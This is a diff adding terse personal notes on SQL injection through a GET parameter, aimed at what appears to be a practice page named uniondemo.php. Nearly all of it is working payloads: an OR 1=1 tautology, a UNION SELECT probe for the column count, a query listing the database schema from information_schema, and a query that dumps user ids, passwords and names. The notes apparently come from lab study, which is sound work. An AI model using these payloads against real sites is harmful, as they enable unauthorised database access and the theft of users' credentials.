@@ -61,3 +61,34 @@ UNION SELECT carID,2,type,name,year from session.car
 
 
 
+
+
+Get Method
+Watch URL while testing options
+example of what to do with URL: /uniondemo.php?Selection=4 OR 1=1
+check number of columns
+  /uniondemo.php?Selection=4 UNION SELECT 1,2,3
+Golden
+UNION SELECT table_schema, column_name, table_name from information_schema.columns
+
+
+/uniondemo.php?Selection=4 UNION SELECT id, pass, name from session.user
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
